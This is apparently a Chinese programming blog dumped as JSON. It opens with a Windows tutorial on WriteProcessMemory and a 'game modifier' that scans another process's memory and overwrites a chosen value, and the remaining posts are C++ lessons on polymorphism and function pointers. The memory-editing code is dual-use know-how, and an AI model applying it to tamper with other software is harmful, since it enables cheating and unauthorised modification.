WriteProcessMemory是计算机语言中的一种函数。此函数能写入某一进程的内存区域（直接写入会出Access Violation错误），故需此函数入口区必须可以访问，否则操作将失败。 1234567BOOL WriteProcessMemory(HANDLE hProcess, //由OpenProcess返回的进程句柄。LPVOID lpBaseAddress, //要写的内存首地址LPVOID lpBuffer, //指向要写的数据的指针。DWORD nSize, //要写入的字节数。LPDWORD lpNumberOfBytesWritten //用来供函数返回实际写入的字节数); 应该在目标进程的整个用户地址空间进行搜索。在进程的整个4GB地址中，Windows 98系列的操作系统为应用程序预留的是4MB到2GB部分，Windows2000系列的操作系统预留的是64KB到2GB部分，所以在搜索前还要先判断操作系统的类型，以决定搜索的范围。 OSVERSIONINFO 操作系统的信息版本结构 123456789101112131415typedef struct _OSVERSIONINFO &#123;DWORD dwOSVersionInfoSize; // 本结构的大小，必须在调用之前设置DWORD dwMajorVersion;//操作系统的主版本号DWORD dwMinorVersion;//操作系统的次版本号DWORD dwBuildNumber;//操作系统的编译版本号DWORD dwPlatformld;//操作系统平台。可以是VER_PLATFORM_WIN32_NT (2000系列)等TCHAR szCSDVersion[128];//指定安装在系统上的最新服务包，例如“Service Pack3&quot;等&#125; OSVERSIONINFO; GetVersionEX返回当前操作系统的版本号（在64位系统上是32位字节长度）。 123BOOL GetVersionEx(LPOSVERSIONINFO lpVersionInformation // 指向版本信息结构体的指针); 游戏修改器例子 Windows采用了分页机制来管理内存，每页的大小是4KB (在x86处理器上)。也就是说Windows是以4KB为单位来为应用程序分配内存的。所以可以按页来搜索目标内存，以提高搜索效率。下面的CompareAPage函数的功能就是比较目标进程内存中1页大小的内存。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160///////////////////////////////////////////////////////////////// 02MemRepair.cpp文件#define _CRT_SECURE_NO_WARNINGS#include \"windows.h\"#include \"stdio.h\"#include &lt;iostream&gt;BOOL FindFirst(DWORD dwValue); // 在目标进程空间进行第一次查找BOOL FindNext(DWORD dwValue); // 在目标进程地址空间进行第2、3、4……次查找DWORD g_arList[1024]; // 地址列表int g_nListCnt; // 有效地址的个数HANDLE g_hProcess; // 目标进程句柄//////////////////////BOOL WriteMemory(DWORD dwAddr, DWORD dwValue);void ShowList();int main(int argc, char* argv[])&#123; // 启动02testor进程 char szFileName[] = \"ConsoleApplication1.exe\"; STARTUPINFO si = &#123; sizeof(si) &#125;; PROCESS_INFORMATION pi; ::CreateProcess(NULL, szFileName, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi); // 关闭线程句柄，既然我们不使用它 ::CloseHandle(pi.hThread); g_hProcess = pi.hProcess; // 输入要修改的值 int iVal; printf(\" Input val = \"); scanf(\"%d\", &amp;iVal); // 进行第一次查找 FindFirst(iVal); // 打印出搜索的结果 ShowList(); while(g_nListCnt &gt; 1) &#123; printf(\" Input val = \"); scanf(\"%d\", &amp;iVal); // 进行下次搜索 FindNext(iVal); // 显示搜索结果 ShowList(); &#125; // 取得新值 printf(\" New value = \"); scanf(\"%d\", &amp;iVal); // 写入新值 if(WriteMemory(g_arList[0], iVal)) printf(\" Write data success \\n\"); ::CloseHandle(g_hProcess); return 0;&#125;BOOL CompareAPage(DWORD dwBaseAddr, DWORD dwValue)&#123; // 读取1页内存 BYTE arBytes[4096]; if(!::ReadProcessMemory(g_hProcess, (LPVOID)dwBaseAddr, arBytes, 4096, NULL)) return FALSE; // 此页不可读 // 在这1页内存中查找 DWORD* pdw; for(int i=0; i&lt;(int)4*1024-3; i++) &#123; pdw = (DWORD*)&amp;arBytes[i]; if(pdw[0] == dwValue) // 等于要查找的值？ &#123; if(g_nListCnt &gt;= 1024) return FALSE; // 添加到全局变量中 g_arList[g_nListCnt++] = dwBaseAddr + i; &#125; &#125; return TRUE;&#125;BOOL FindFirst(DWORD dwValue)&#123; const DWORD dwOneGB = 1024*1024*1024; // 1GB const DWORD dwOnePage = 4*1024; // 4KB if(g_hProcess == NULL) return FALSE; // 查看操作系统类型，以决定开始地址 DWORD dwBase; OSVERSIONINFO vi = &#123; sizeof(vi) &#125;; ::GetVersionEx(&amp;vi); if (vi.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) dwBase = 4*1024*1024; // Windows 98系列，4MB else dwBase = 64*1024; // Windows NT系列，64KB // 在开始地址到2GB的地址空间进行查找 for(; dwBase &lt;2*dwOneGB; dwBase += dwOnePage) &#123; // 比较1页大小的内存 CompareAPage(dwBase, dwValue); &#125; return TRUE;&#125;BOOL FindNext(DWORD dwValue)&#123; // 保存m_arList数组中有效地址的个数，初始化新的m_nListCnt值 int nOrgCnt = g_nListCnt; g_nListCnt = 0; // 在m_arList数组记录的地址处查找 BOOL bRet = FALSE; // 假设失败 DWORD dwReadValue; for(int i=0; i&lt;nOrgCnt; i++) &#123; if(::ReadProcessMemory(g_hProcess, (LPVOID)g_arList[i], &amp;dwReadValue, sizeof(DWORD), NULL)) &#123; if(dwReadValue == dwValue) &#123; g_arList[g_nListCnt++] = g_arList[i]; bRet = TRUE; &#125; &#125; &#125; return bRet;&#125;// 打印出搜索到的地址void ShowList()&#123; for(int i=0; i&lt; g_nListCnt; i++) &#123; printf(\"%08lX \\n\", g_arList[i]); &#125;&#125;BOOL WriteMemory(DWORD dwAddr, DWORD dwValue)&#123; return ::WriteProcessMemory(g_hProcess, (LPVOID)dwAddr, &amp;dwValue, sizeof(DWORD), NULL);&#125; 123456789101112131415161718192021222324///////////////////////////////////////////////////////////////// 02Testor.cpp文件#include &lt;stdio.h&gt;// 全局变量测试int g_nNum; int main(int argc, char* argv[])&#123; int i = 198; // 局部变量测试 g_nNum = 1003; while(1) &#123; // 输出个变量的值和地址 printf(\" i = %d, addr = %08lX; g_nNum = %d, addr = %08lX \\n\", ++i, &amp;i, --g_nNum, &amp;g_nNum); getchar(); &#125; return 0;&#125;","categories":[{"name":"windows程序设计","slug":"windows程序设计","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计/"}],"tags":[]},{"title":"windows程序设计基础","slug":"win0001-windows程序设计基础","date":"2021-05-18T17:32:42.000Z","updated":"2021-05-18T18:05:13.407Z","comments":true,"path":"2021/05/19/win0001-windows程序设计基础/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/19/win0001-windows程序设计基础/","excerpt":"","text":"windows程序设计基础 Win32 API 简介 API(Application Programming Interface) 应用程序编程接口 提供了各种各样与windows系统服务有关的函数 SDK编程就是直接调用API函数进行编程 Win32 API 是指编制32应用程序时使用的一组函数、结构、宏定义。 应用程序类型 windows支持两种类型的应用程序: Graphical User Interface（GUI ）图形用户界面 Console User Interface（CUI ）控制台用户界面 API函数的调用方法 1234567891011121314///////////////////////////////////////////////////////////////// 01FirstApp.cpp文件#include &lt;windows.h&gt; // 包含MessageBox函数声明的头文件int main(int argc, char* argv[])&#123; // 调用API函数MessageBox int nSelect = ::MessageBox(NULL, &quot;Hello, Windows XP&quot;, &quot;Greetings&quot;, MB_OKCANCEL); if(nSelect == IDOK) printf(&quot; 用户选择了“确定”按钮 \\n&quot;); else printf(&quot; 用户选择了“取消”按钮 \\n&quot;); return 0;&#125; 调用windows API 需要包含windows.h头文件 ::MessageBox 在函数前面加上::表示是一个全局函数与c++成员函数区分开 代码风格 变量的命名 【限定范围的前缀】 + 【数据类型前缀】+【有意义的单词】 g_szTitle 常量：用全大写字母 全局变量：g_开头 sz开头：表示以‘\\0’结尾的字符串 类的成员变量：以m_开头 局部变量：【数据类型前缀】+【有意义的单词】bResult b代表BOOL类型 函数名：每个单词首字母大写 CreateFile 类名：CStudent C代表class 结构体：SStudent S代表struct","categories":[{"name":"windows程序设计","slug":"windows程序设计","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计/"}],"tags":[]},{"title":"面向抽象类编程实现计算程序员工资","slug":"cpp0060-面向抽象类编程实现计算程序员工资","date":"2021-05-14T10:47:25.000Z","updated":"2021-05-14T10:51:53.056Z","comments":true,"path":"2021/05/14/cpp0060-面向抽象类编程实现计算程序员工资/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/14/cpp0060-面向抽象类编程实现计算程序员工资/","excerpt":"","text":"面向抽象类编程实现计算程序员工资 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;/*抽象层*///程序员抽象类class Programmer&#123;public: //打印程序员工资纯虚函数 virtual void PrintPaid() = 0; Programmer() &#123;&#125;; Programmer(double tPaid) :paid(tPaid) &#123;&#125;; virtual ~Programmer() &#123; cout &lt;&lt; \"~Programmer()...\" &lt;&lt; endl; &#125; //获取程序员工资 double getPaid() &#123; return paid; &#125;private: double paid;&#125;;/*实现层*///初级程序员类class Junior_programmer : public Programmer &#123;public: Junior_programmer()&#123;&#125; Junior_programmer(double paid):Programmer(paid)&#123;&#125; virtual void PrintPaid() &#123; cout &lt;&lt; \"Junior_programmer :\" &lt;&lt; getPaid() &lt;&lt; endl; &#125; ~Junior_programmer() &#123; cout &lt;&lt; \"~Junior_programmer()...\" &lt;&lt; endl; &#125;&#125;;//中级程序员类class Mid_programmer : public Programmer&#123;public: Mid_programmer()&#123;&#125; Mid_programmer(double paid) :Programmer(paid) &#123;&#125; virtual void PrintPaid() &#123; cout &lt;&lt; \"Mid_programmer :\" &lt;&lt; getPaid() &lt;&lt; endl; &#125; ~Mid_programmer() &#123; cout &lt;&lt; \"~Mid_programmer()...\" &lt;&lt; endl; &#125;&#125;;//高级程序员类class Adv_programmer : public Programmer &#123;public: Adv_programmer(double paid) :Programmer(paid) &#123;&#125; Adv_programmer()&#123;&#125; virtual void PrintPaid() &#123; cout &lt;&lt; \"Adv_programmer :\" &lt;&lt; getPaid() &lt;&lt; endl; &#125; ~Adv_programmer() &#123; cout &lt;&lt; \"~Adv_programmer()...\" &lt;&lt; endl; &#125;&#125;;//架构师类class Architect : public Programmer&#123;public: Architect(double paid) :Programmer(paid) &#123;&#125; Architect()&#123;&#125; virtual void PrintPaid() &#123; cout &lt;&lt; \"Architect :\" &lt;&lt; getPaid() &lt;&lt; endl; &#125; ~Architect() &#123; cout &lt;&lt; \"~Architect\" &lt;&lt; endl; &#125;&#125;;/*后序拓展只需要 1.创建一个类并继承Programmer 2.重写virtual void PrintPaid()函数*//*class XXX : public Programmer &#123;public: virtual void PrintPaid() &#123; cout &lt;&lt; \"XXX :\" &lt;&lt; getPaid() &lt;&lt; endl; &#125;&#125;;*/void ShowProgrammerPaid(Programmer * p) &#123; if (p != NULL) &#123; p-&gt;PrintPaid(); delete p; p = NULL; &#125; cout &lt;&lt; \"====================\" &lt;&lt; endl &lt;&lt; endl;&#125;/*业务逻辑层*/int main(char *argv[], int argc)&#123; ShowProgrammerPaid(new Junior_programmer(10000)); ShowProgrammerPaid(new Mid_programmer(15000)); ShowProgrammerPaid(new Adv_programmer(20000)); ShowProgrammerPaid(new Architect(30000)); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"C语言函数指针的锦囊妙计","slug":"cpp0059-C语言函数指针的锦囊妙计","date":"2021-05-13T18:17:04.000Z","updated":"2021-05-13T18:18:24.678Z","comments":true,"path":"2021/05/14/cpp0059-C语言函数指针的锦囊妙计/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/14/cpp0059-C语言函数指针的锦囊妙计/","excerpt":"","text":"C语言函数指针的锦囊妙计 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;// 定义一个锦囊的方法 是一个函数指针，类似于c++的纯虚函数typedef void(TIPS_FUNC)(void);//写一个锦囊的结构体struct tips&#123; char from[64]; //这个锦囊是谁写的 char to[64]; //写给谁的 TIPS_FUNC *fp; //具体锦囊的内容&#125;;//写一个供赵云调用的架构函数void open_tips(struct tips * tp)&#123; cout &lt;&lt; \"打开了锦囊\" &lt;&lt; endl; cout &lt;&lt; \"此锦囊是由\" &lt;&lt; tp-&gt;from &lt;&lt; \", 写给\" &lt;&lt; tp-&gt;to &lt;&lt; endl; cout &lt;&lt; \"内容是\" &lt;&lt; endl; tp-&gt;fp();//拆开锦囊，调用具体锦囊的方法&#125;//实现一个一个的锦囊 //类似于实现一个纯虚函数void tips_1(void)&#123; cout &lt;&lt; \"一到东吴就大张旗鼓找乔国老\" &lt;&lt; endl;&#125;void tips_2(void)&#123; cout &lt;&lt; \"骗刘备 操作压境\" &lt;&lt; endl;&#125;void tips_3(void)&#123; cout &lt;&lt; \"找孙尚香求救\" &lt;&lt; endl;&#125;void tips_4(void)&#123; cout &lt;&lt; \"你们就死在东吴把\" &lt;&lt; endl;&#125;struct tips* create_tips(char *from, char *to, TIPS_FUNC *fp)&#123; struct tips *tp = (struct tips*)malloc(sizeof(struct tips)); if (tp == NULL) &#123; return NULL; &#125; strcpy(tp-&gt;from, from); strcpy(tp-&gt;to, to); //注册回调函数 tp-&gt;fp = fp; //给拥有函数指针的结构体 函数指针变量 赋值 就是 注册回调函数 return tp;&#125;void destory_tips(struct tips * tp)&#123; if (tp != NULL) &#123; free(tp); &#125;&#125;int main(void)&#123; //诸葛亮去写锦囊 struct tips * tp1 = create_tips(\"孔明\", \"赵云\", tips_1); struct tips * tp2 = create_tips(\"孔明\", \"赵云\", tips_2); struct tips * tp3 = create_tips(\"孔明\", \"赵云\", tips_3); struct tips *tp4= create_tips(\"庞统\", \"赵云\", tips_4); // 赵云去拆机囊 cout &lt;&lt; \"刚来到 东吴境内 ，打开了第一个锦囊\" &lt;&lt; endl; open_tips(tp1); cout &lt;&lt; \"刘备乐不思蜀 ，打开第二个锦囊 \" &lt;&lt; endl; open_tips(tp2); cout &lt;&lt; \"孙权追杀刘备, 打开第三个锦囊\" &lt;&lt; endl; open_tips(tp3); cout &lt;&lt; \"赵云发现 抵挡不住 军队，想到了庞统的最后一个锦囊 打开了\" &lt;&lt; endl; open_tips(tp4); destory_tips(tp1); destory_tips(tp2); destory_tips(tp3); destory_tips(tp4); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"函数指针的语法和意义","slug":"cpp0058-函数指针的语法和意义","date":"2021-05-13T17:50:06.000Z","updated":"2021-05-13T17:52:36.849Z","comments":true,"path":"2021/05/14/cpp0058-函数指针的语法和意义/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/14/cpp0058-函数指针的语法和意义/","excerpt":"","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;//定义一个函数int func(int a, int b) &#123; cout &lt;&lt; \"func 111 \" &lt;&lt; endl; return 0;&#125;//定义一个函数指针// C语言中 决定一个函数类型// 返回值 参数列表typedef int(FUNC)(int, int); //定义一个函数类型typedef int(*FUNC_POINTER)(int, int); //定义一个函数指针类型//如何将一个函数指针当成一个函数参数呢？void my_function(FUNC *fp)&#123; fp(10, 20);&#125;void my_function2(FUNC_POINTER fp)&#123; fp(10, 20);&#125;//他是一个架构函数。 void my_function3(int(*fp)(int, int))&#123; cout &lt;&lt; \"1999 年写的架构\" &lt;&lt; endl; cout &lt;&lt; \"固定业务1\" &lt;&lt; endl; fp(10, 20); cout &lt;&lt; \"固定业务2\" &lt;&lt; endl;&#125;//2015 实现一个子函数int my_new_function(int a, int b)&#123; cout &lt;&lt; a &lt;&lt; b &lt;&lt; endl; cout &lt;&lt; \"2015年实现的新业务\" &lt;&lt; endl; return 0;&#125;int main(void)&#123; FUNC * p = func; FUNC_POINTER p2 = func; int(*fp)(int, int) = func; p(10, 20); (*p)(10, 20); //以上两种写法等价 p2(10, 20); (*p2)(20, 20); fp(10, 20); cout &lt;&lt; \" -------- \" &lt;&lt; endl; //2015 实现一个子函数，再调用1999的架构 my_function3(my_new_function); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"利用抽象类实现电脑组装案例","slug":"cpp0057-利用抽象类实现电脑组装案例","date":"2021-05-13T15:44:59.000Z","updated":"2021-05-13T15:54:19.815Z","comments":true,"path":"2021/05/13/cpp0057-利用抽象类实现电脑组装案例/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0057-利用抽象类实现电脑组装案例/","excerpt":"","text":"利用抽象类实现电脑组装案例 面向抽象类编程 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;/*===========start抽象层============*///CPU抽象类class CPU &#123;public: virtual void caculate() = 0;&#125;;//显卡抽象类class Card &#123;public: virtual void display() = 0;&#125;;//内存条抽象类class Memory &#123;public: virtual void storage() = 0;&#125;;class Computer &#123;public: Computer(CPU *tcpu1, Card * tcard, Memory * tmemory) :cpu1(tcpu1), card(tcard), memory(tmemory) &#123;&#125;; void print() &#123; cpu1-&gt;caculate(); card-&gt;display(); memory-&gt;storage(); cout &lt;&lt; \"=========================\" &lt;&lt; endl; &#125;private: CPU *cpu1; Card * card; Memory * memory;&#125;;/*===========end抽象层============*//*===========start实现层============*///Intel//IntelCPUclass IntelCpu :public CPU &#123;public: virtual void caculate() &#123; cout &lt;&lt; \"IntelCPU\" &lt;&lt; endl; &#125;&#125;;//Intel显卡class IntelCard : public Card &#123;public: virtual void display() &#123; cout &lt;&lt; \"IntelCard\" &lt;&lt; endl; &#125;;&#125;;//Intel内存条class IntelMemory :public Memory &#123;public: virtual void storage() &#123; cout &lt;&lt; \"IntelMemory\" &lt;&lt; endl; &#125;;&#125;;//NIVDE显卡class NVIDIACard : public Card &#123;public: virtual void display() &#123; cout &lt;&lt; \"NVIDIACard\" &lt;&lt; endl; &#125;;&#125;;//Kingston内存条class KingstonMemory :public Memory &#123;public: virtual void storage() &#123; cout &lt;&lt; \"KingstonMemory\" &lt;&lt; endl; &#125;;&#125;;/*===========end实现层============*//*===========业务逻辑层============*/int main(char *argv[], int argc)&#123; //组装一台纯Intel的电脑 Computer p1(new IntelCpu,new IntelCard,new IntelMemory); p1.print(); //组装一台IntelCpu,NVIDIACard,KingstonMemory的电脑 Computer p2(new IntelCpu, new NVIDIACard, new KingstonMemory); p2.print(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"纯虚函数和抽象类","slug":"cpp0056-纯虚函数和抽象类","date":"2021-05-12T23:33:38.000Z","updated":"2021-05-12T23:50:18.483Z","comments":true,"path":"2021/05/13/cpp0056-纯虚函数和抽象类/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0056-纯虚函数和抽象类/","excerpt":"","text":"纯虚函数和抽象类 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//图形类//拥有纯虚函数的类， 就叫抽象类class Shape&#123;public: //是一个抽象的接口，说明图形是有一个得到面积方法 virtual double getArea() = 0;//代表一个接口，一个求图形面积的接口 //定义一个个打印面积的接口 virtual void print() = 0;&#125;;//圆类//如果 一个子类继承了抽象类， 那么一定要重写这个纯虚函数。class Circle :public Shape&#123;public: Circle(double r) &#123; this-&gt;r = r; &#125; //重写父类抽象类的纯虚函数 virtual double getArea() &#123; return 3.14 * r * r; &#125; virtual void print() &#123; cout &lt;&lt; \"圆的面积是\" &lt;&lt; endl; cout &lt;&lt; this-&gt;getArea() &lt;&lt; endl; &#125; private: double r;//半径&#125;;//实现一个正方形class Rect :public Shape&#123;public: Rect(double a) &#123; this-&gt;a = a; &#125; //是一个抽象的接口，说明图形是有一个得到面积方法 virtual double getArea() &#123; return a*a; &#125; //顶一个打印面积的接口 virtual void print() &#123; cout &lt;&lt; \"正方形的面积是\" &lt;&lt; endl; cout &lt;&lt; this-&gt;getArea() &lt;&lt; endl; &#125;private: double a;//边长&#125;;//三角形class Tri :public Shape&#123;public: Tri(double a, double h) &#123; this-&gt;a = a; this-&gt;h = h; &#125; virtual double getArea() &#123; return 0.5 * h * a; &#125; virtual void print() &#123; cout &lt;&lt; \"三角形的面积是\" &lt;&lt; endl; cout &lt;&lt; this-&gt;getArea() &lt;&lt; endl; &#125;private: double a;//底 double h;//高&#125;;//一个传递抽象类 指针的架构函数void printArea(Shape *p)&#123; p-&gt;print();&#125;//业务层int main(void)&#123; //Shape p;//抽象类不能够实例化 Shape *sp = new Circle(10.0); //抽象类的指针就可以调用纯虚函数， 接口 //sp-&gt;getArea();//在此处就发生了多态 //cout &lt;&lt; sp-&gt;getArea() &lt;&lt; endl; //delete sp; printArea(sp); delete sp; //创建一个正方形的对象。用抽象类指针（父类指针）指向子类对象 sp = new Rect(10.0); printArea(sp); delete sp; //业务层 根本就不关心 具体对象怎么实现的， 只用抽象类的指针就可以。 Shape *sp2 = new Tri(10, 20); sp2-&gt;print(); delete sp2; cout &lt;&lt; \" ------ \" &lt;&lt; endl; return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"父类指针和子类指针的步长","slug":"cpp0055-父类指针和子类指针的步长","date":"2021-05-12T22:31:49.000Z","updated":"2021-05-12T22:59:07.706Z","comments":true,"path":"2021/05/13/cpp0055-父类指针和子类指针的步长/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0055-父类指针和子类指针的步长/","excerpt":"","text":"父类指针和子类指针的步长 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;class Parent&#123;public: Parent(int a) &#123; this-&gt;a = a; &#125; virtual void print() &#123; cout &lt;&lt; \"Parent::print() \" &lt;&lt; a &lt;&lt; endl; &#125;protected: int a;&#125;;class Child :public Parent&#123;public: Child(int a) :Parent(a) &#123; &#125; virtual void print() &#123; cout &lt;&lt; \"Child :: Print() \" &lt;&lt; a &lt;&lt;endl; &#125;private: int b;&#125;;int main(void)&#123; Child array[] = &#123;Child(0), Child(1), Child(2) &#125;; // array[0] array[1] array[2] Child *cp = &amp;array[0]; Parent *pp = &amp;array[0]; cp-&gt;print(); //Child:: pp-&gt;print(); //Child::发生多态 cout &lt;&lt; \"------\" &lt;&lt; endl; cp++; //Child::12 //pp++;//8 pp = cp; cp-&gt;print(); pp-&gt;print(); cout &lt;&lt; \" ----- \" &lt;&lt; endl; int i = 0; for (i = 0, cp = &amp;array[0], pp = cp; i &lt; 3; i++, cp++, pp =cp) &#123; pp-&gt;print(); &#125; return 0;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class Fu&#123;public: Fu(); Fu(int ta): a(ta) &#123;&#125;; ~Fu(); virtual void print() &#123; cout &lt;&lt; \"Fu a = \"&lt;&lt; a &lt;&lt; endl; &#125;private: int a;&#125;;class Zi : public Fu&#123;public: Zi(); Zi(int a, int tb) :Fu(a) ,b(tb)&#123;&#125;; virtual void print() &#123; cout &lt;&lt; \"Zi b = \" &lt;&lt; b &lt;&lt; endl; &#125; ~Zi(); private: int b;&#125;;Zi::Zi()&#123;&#125;Zi::~Zi()&#123;&#125;Fu::Fu()&#123;&#125;Fu::~Fu()&#123;&#125;int main(char *argv[], int argc)&#123; Zi zi[] = &#123; Zi(100,200),Zi(300,400),Zi(500,600) &#125;; Fu * pFu = zi; /* 会崩溃,因为(pFu + i) == (pFu + sizeof Fu) 而不是(pFu + sizeof Zi) for (int i = 0; i &lt; 3; i++) &#123; (pFu + i)-&gt;print(); &#125; */ //解决方法 Zi * zi1[] = &#123; new Zi(1,2),new Zi(3,4), new Zi(5,6), new Zi(7,8) &#125;; for (int i = 0; i &lt; sizeof(zi1) / sizeof(Zi *); i++) &#123; pFu = zi1[i]; pFu-&gt;print(); &#125; return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"vptr指针的分布初始化","slug":"cpp0054-vptr指针的分布初始化","date":"2021-05-12T22:27:20.000Z","updated":"2021-05-12T22:31:03.955Z","comments":true,"path":"2021/05/13/cpp0054-vptr指针的分布初始化/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0054-vptr指针的分布初始化/","excerpt":"","text":"vptr指针的分布初始化 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;// 不要在构造函数中去调用成员函数。class Parent&#123;public: Parent(int a) &#123; cout &lt;&lt; \"Parent(int a)....\" &lt;&lt; endl; this-&gt;a = a; print(); //这个print打印的是 Parent 还是 Child的？ //调用的是父类的 &#125; //虚函数 virtual void print() &#123; cout &lt;&lt; \"Parent::print(): \" &lt;&lt; a &lt;&lt; endl; &#125;private: int a;&#125;;class Child : public Parent&#123;public: Child(int a, int b) :Parent(a) &#123; //vptr指针就执行的子类的虚函数表 print(); //执行的child ？ 还是 parent? //再此处之前， 是构造父类的内存空间 此时child还有没构造完毕，vptr指针此时指向的是父类的虚函数表 cout &lt;&lt; \"Child() ...\" &lt;&lt; endl; this-&gt;b = b; &#125; //重写了父类的虚函数 virtual void print() &#123; cout &lt;&lt; \"Child::print() \"&lt;&lt; \" , \" &lt;&lt;b &lt;&lt; endl; &#125;private: int b;&#125;;int main(void)&#123; Parent *p = new Child(10, 20);//在此调用Child 的构造函数 p-&gt;print(); //此时发生了多态 delete p; return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"验证vptr指针的存在","slug":"cpp0053-验证vptr指针的存在","date":"2021-05-12T22:24:38.000Z","updated":"2021-05-12T22:27:46.227Z","comments":true,"path":"2021/05/13/cpp0053-验证vptr指针的存在/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0053-验证vptr指针的存在/","excerpt":"","text":"验证vptr指针的存在 1234567891011121314151617181920212223242526272829303132333435363738394041#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;class Parent&#123;public: void func(int a, int b) &#123; cout &lt;&lt; \"Parent func \" &lt;&lt; endl; &#125;private: int a;&#125;;class Parent2&#123;public: virtual void func(int a, int b) &#123; cout &lt;&lt; \"Parent2 func \" &lt;&lt; endl; &#125;private: int a;&#125;;int main(void)&#123; Parent p1; Parent2 p2; cout &lt;&lt; \"sizeof(p1)\" &lt;&lt; sizeof(p1) &lt;&lt; endl; cout &lt;&lt; \"sizeof(p2)\" &lt;&lt; sizeof(p2) &lt;&lt; endl; //p2多出来的4个字节就是存放vptr指针的空间大小 //vptr指针我们访问不了，vptr指针指向的是Parent2类的虚函数表 //此表中目前有一个 虚函数 func(inta, intb)的入口地址。 return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"多态的原理","slug":"cpp0052-多态的原理","date":"2021-05-12T22:15:59.000Z","updated":"2021-05-12T22:21:59.804Z","comments":true,"path":"2021/05/13/cpp0052-多态的原理/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0052-多态的原理/","excerpt":"","text":"多态的原理","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"重载重写重定义","slug":"cpp0051-重载重写重定义","date":"2021-05-12T19:05:42.000Z","updated":"2021-05-12T19:06:32.029Z","comments":true,"path":"2021/05/13/cpp0051-重载重写重定义/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0051-重载重写重定义/","excerpt":"","text":"重载重写重定义","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"虚析构函数","slug":"cpp0050-虚析构函数","date":"2021-05-12T18:49:15.000Z","updated":"2021-05-12T18:59:02.776Z","comments":true,"path":"2021/05/13/cpp0050-虚析构函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0050-虚析构函数/","excerpt":"","text":"虚析构函数 通过父类指针将所有子类对象析构掉,需要用到虚析构函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;class A&#123;public: A() &#123; cout &lt;&lt; \"A() ...\" &lt;&lt; endl; this-&gt;p = new char[64]; //给p开辟了一个空间 memset(p, 0, 64); strcpy(p, \"A string \"); &#125; virtual void print() &#123; cout &lt;&lt; p &lt;&lt; endl; &#125; virtual ~A() &#123; cout &lt;&lt; \"~A()....\" &lt;&lt; endl; if (p != NULL) &#123; delete[] p; p = NULL; &#125; &#125;private: char *p; &#125;;class B : public A&#123;public: B() &#123; cout &lt;&lt; \"B()...\" 